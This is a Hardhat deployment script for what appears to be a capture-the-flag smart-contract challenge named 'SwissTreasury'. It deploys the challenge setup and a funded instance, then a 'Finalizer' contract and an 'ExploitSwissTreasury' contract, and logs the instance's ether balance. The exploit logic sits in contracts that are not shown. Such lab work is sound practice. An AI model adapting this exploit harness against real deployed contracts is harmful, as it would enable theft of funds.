const { ethers, waffle } = require("ethers")
const { network } = require("hardhat")

const main = async () => {
     
    const SetupFactory = await hre.ethers.getContractFactory("SetupSwissTreasury")
    const setupContract = await SetupFactory.deploy()
    await setupContract.deployed()
    console.log("setup contract deployed at: ",setupContract.address)

    //create instance 
    const instanceAddress = await setupContract.callStatic.createInstance({value: ethers.utils.parseEther("0.01")})
    const tx = await setupContract.createInstance({value: ethers.utils.parseEther("0.01")})
    tx.wait()
    console.log("instance address: ", instanceAddress)


    //deploy finalize contract 

    const balanceInWeiBefore = await hre.ethers.provider.getBalance(instanceAddress);
    console.log("balance before: ", balanceInWeiBefore)

    const FinalizerFactory = await hre.ethers.getContractFactory("Finalizer");
    const finalizerContract = await FinalizerFactory.deploy(instanceAddress, "0xa2bb722f87660C0F080A77ad2E830e830495162D")
    await finalizerContract.deployed()

    const exploitFactory = await hre.ethers.getContractFactory("ExploitSwissTreasury")
    const exploitContract =  await exploitFactory.deploy(instanceAddress, "0xa2bb722f87660C0F080A77ad2E830e830495162D", finalizerContract.address)
    
    // await exploitContract.finalize()
    // const exploitContract =  await exploitFactory.deploy(instanceAddress, "0xa2bb722f87660C0F080A77ad2E830e830495162D", {gasLimit: 5000000})
    // await exploitContract.executeBatch
    const balanceInWei = await hre.ethers.provider.getBalance(instanceAddress);

    console.log("balance: ", balanceInWei )
    console.log("exploit contract deployed at: ", exploitContract.address)    

}





main()
.then(() => process.exit(0))
.catch((error) => {
  console.error(error);
  process.exit(1);
});
